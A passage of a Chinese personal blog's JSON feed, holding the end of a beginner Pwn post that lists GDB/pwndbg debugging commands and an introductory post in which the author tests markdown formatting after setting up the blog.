data-src=\"https://s2.loli.net/2024/06/02/t2C1cs4vg98WwQh.jpg\" alt=\"1\" /></p>\n<h1 id=\"gdb调试\"><a class=\"anchor\" href=\"#gdb调试\">#</a> GDB 调试</h1>\n<ol>\n<li>gdb 文件名 进入 pwndbg 动态调试</li>\n<li>break 函数名 或 break 地址值 或 break C 语言行号 设断点</li>\n<li>run/r—— 运行程序 next 步过 step 步进</li>\n<li>stack 整数 查看多少栈</li>\n<li>vmmap 显示虚拟内存空间的分布</li>\n<li>info b 查看当前的断点 d &lt;num&gt; 删除某一个断点</li>\n<li>s 进入函数</li>\n<li>c （continue ）让程序继续执行</li>\n<li>p &amp;printf 查看 printf 函数的真实地址</li>\n<li>x/10wx 地址 查看该地址后 10 个内存单元的内容</li>\n<li>xinfo 地址 查看该地址信息，包括偏移等</li>\n</ol>\n<h1 id=\"保护机制\"><a class=\"anchor\" href=\"#保护机制\">#</a> 保护机制</h1>\n<p><img data-src=\"https://s2.loli.net/2024/06/02/RSdGcilVUv81L7Q.jpg\" alt=\"1\" /></p>\n",
            "tags": [
                "Pwn",
                "stack"
            ]
        },
        {
            "id": "http://jexy-kynner.github.io/2024/05/10/%E6%A5%94%E5%AD%90/",
            "url": "http://jexy-kynner.github.io/2024/05/10/%E6%A5%94%E5%AD%90/",
            "title": "楔子",
            "date_published": "2024-05-09T16:39:16.000Z",
            "content_html": "<h1 id=\"测试markdown\"><a class=\"anchor\" href=\"#测试markdown\">#</a> 测试 markdown</h1>\n<h2 id=\"唠嗑\"><a class=\"anchor\" href=\"#唠嗑\">#</a> 唠嗑</h2>\n<p>历时 2 天终于！！！搭建好博客，把主题美化好。<br />\n最后我竟然挑了很多二次元背景图（）<br />\n<s>哦，界面的音乐还是别人的，等有时间再慢慢调吧</s></p>\n<p>之前用的是酷狗，but 博主用的是网易云 555<br />\n 好在一番操作音乐导入成功！<br />\n<s>注：搜索功能还没配太好，可以点击 but 搜不到</s><br />\n<s>我也不知道是什么原因，不想调了，估计也没什么人搜索 ()</s></p>\n<p>耶耶耶！！搜索功能它好啦！！<br />\n搭建过程不少辛酸事（U ´ᴥ` U）<br />\n总在快成功的时候删除所有文件从头开始...<br />\n 一想到以后每周都要写 blog.<br />\n 还不太熟练 markdown，过来练练。</p>\n<h1 id=\"一级标题\"><a class=\"anchor\" href=\"#一级标题\">#</a> 一级标题</h1>\n<h2 id=\"二级\"><a class=\"anchor\" href=\"#二级\">#</a> 二级</h2>\n<h3 id=\"三级\"><a class=\"anchor\" href=\"#三级\">#</a> 三级</h3>\n<p>哦，天哪，# 后和 - * + 要空格！！</p>\n<p><em>斜体</em><br />\n<em>斜体</em><br />\n<strong>粗</strong><br />\n<em><strong>粗斜</strong></em><br />\n<s>删除线</s></p>\n<h4 id=\"链接测试\"><a class=\"anchor\" href=\"#链接测试\">#</a> 链接测试</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSmV4eQ==\">我的博客园</span><br />\n [博客][1][2]<br />\n[1]:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSmV4eQ==\">https://www.cnblogs.com/Jexy</span><br />\n[2]:<a href=\"https://jexy-kynner.github.io/\">https://jexy-kynner.github.io/</a><br />\n 文字：废话<a href=\"https://jexy-kynner.github.io/archives/\"> https://jexy-kynner.github.io/archives/</a></p>\n<h4 id=\"列表测试\"><a class=\"anchor\" href=\"#列表测试\">#</a> 列表测试</h4>\n<p>无序</p>\n<ul>\n<li>g</li>\n<li>x</li>\n</ul>\n<ul>\n<li>j\n<ul>\n<li>分级 1</li>\n<li>分级 2</li>\n</ul>\n</li>\n</ul>\n<p>有序</p>\n<ol>\n<li>part a</li>\n<li>part b</li>\n<li>part 3\n<ol>\n<li>分级 1</li>\n<li>分级 2</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"插图\"><a class=\"anchor\" href=\"#插图\">#</a> 插图</h2>\n<p><img data-src=\"/images/1.jpg\" alt=\"Lena\" /><br />\n<s> 格式：！<a href=\"\"></a></s></p>\n<h2 id=\"表\"><a class=\"anchor\" href=\"#表\">#</a> 表</h2>\n<table>\n<thead>\n<tr>\n<th>学号</th>\n<th style=\"text-align:left\">姓名</th>\n<th style=\"text-align:center\">性别</th>\n<th style=\"text-align:right\">年龄</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>默认左对齐</td>\n<td style=\"text-align:left\">左</td>\n<td style=\"text-align:center\">居中</td>\n<td style=\"text-align:right\">右</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"引用\"><a class=\"anchor\" href=\"#引用\">#</a> 引用</h3>\n<blockquote>\n<p>引用 1？<br />\n引用 2？</p>\n<blockquote>\n<p>引用 3？</p>\n</blockquote>\n</blockquote>\n<h3 id=\"代码块\"><a class=\"anchor\" href=\"#代码块\">#</a> 代码块</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>成功啦成功啦</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   代码块内容<span class=\"token number\">1111</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   代码块内容<span class=\"token number\">2</span></pre></td></tr></table></figure><h3 id=\"文字特效\"><a class=\"anchor\" href=\"#文字特效\">#</a> 文字特效</h3>\n<p>红框<br />\n<span class=\"kbd red\"> 12333</span><br />\n<span class=\"kbd green\">45678</span><br />\n<span class=\"rainbow\">1234567</span><br />\n2<sup>3 次方</sup></p>\n<p>隐藏文字<br />\n！！黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容<br />\n！！模糊模糊模糊模糊模糊模糊！！{.bulr} ： 选中文字显示内容<br />\n！！黑幕黑幕黑幕！！: 这是黑幕<br />\n！！模糊模糊模糊！！{.bulr}: 这是模糊</p>\n<p>折叠文字</p>\n<details class=\"success\"><summary>段落是绿色的</summary><div>\n<div class=\"tab\" data-id=\"id3\" data-title=\"卡片1\">\n<p>冰淇淋</p>\n</div>\n<div class=\"tab\" data-id=\"id3\" data-title=\"卡片2\">\n<p>墨绿色</p>\n</div>\n</div></details>\n<details class=\"info\"><summary>蓝色</summary><div>\n<div class=\"tab\" data-id=\"id2\" data-title=\"卡片 1\">\n<p>这里是卡片 1 的内容</p>\n</div>\n<div class=\"tab\" data-id=\"id2\" data-title=\"卡片 2\">\n<p>这里是卡片 2 的内容</p>\n</div>\n</div></details>\n<p>表情<br />\n🎶</p>\n<ul class=\"task-list danger\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" disabled=\"true\" /><label for=\"cbx_0\"> 这是一个小叉叉</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_1\"> 这是一个红色勾勾</label></li>\n</ul>\n<div class=\"note info\">\n<p>基本</p>\n</div>\n<div class=\"note warning\">\n<p>警告</p>\n</div>\n<p><span class=\"spoiler\" title=\"你知道得太多了\">balabala</span> 鼠标放置时显示内容。<br />\n<span class=\"spoiler bulr\" title=\"你知道得太多了\">balabala</span> 鼠标选中时显示内容</p>\n",
            "tags": [
                "Pwn",
                "随笔"
            ]
        }
    ]
}